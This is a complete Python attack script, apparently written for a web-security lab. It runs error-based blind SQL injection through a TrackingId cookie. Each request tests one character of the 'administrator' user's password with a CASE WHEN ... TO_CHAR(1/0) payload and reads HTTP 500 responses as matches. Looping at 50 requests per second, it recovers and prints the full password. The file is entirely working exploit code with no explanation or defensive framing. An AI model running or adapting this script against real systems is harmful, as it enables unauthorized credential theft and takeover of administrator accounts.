import requests
import string
import time

# ===================== SETTINGS =====================
URL = ""                           #TYPE YOUR URL HERE
TRACKING_ID = ""           #TYPE YOUR TRACKING_ID HERE
SESSION = ""          #TYPE YOUR SESSION HERE (cookie)

REQUESTS_PER_SECOND = 50
PASSWORD_LENGTH = 20
# ====================================================


DELAY = 1 / REQUESTS_PER_SECOND
CHARS = string.ascii_lowercase + string.ascii_uppercase + string.digits + "!@#$%^&*"
def check_char(position, char):
    payload = f"{TRACKING_ID}' AND (SELECT CASE WHEN (SUBSTR(PASSWORD,{position},1)='{char}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE USERNAME='administrator')='a"
    cookies = {
        "TrackingId": payload,
        "session": SESSION
    }
    print(f"Checking position {position}, char {char}...")
    response = requests.get(URL, cookies=cookies, timeout=10)
    time.sleep(DELAY)
    return response.status_code == 500

password = ""
print(f"Cracking password... ({REQUESTS_PER_SECOND} requests/sec)")

for i in range(1, PASSWORD_LENGTH + 1):
    for char in CHARS:
        if check_char(i, char):
            password += char
            print(f"Char {i}: {char} | Password so far: {password}")
            break

print(f"\nAdministrator password: {password}")
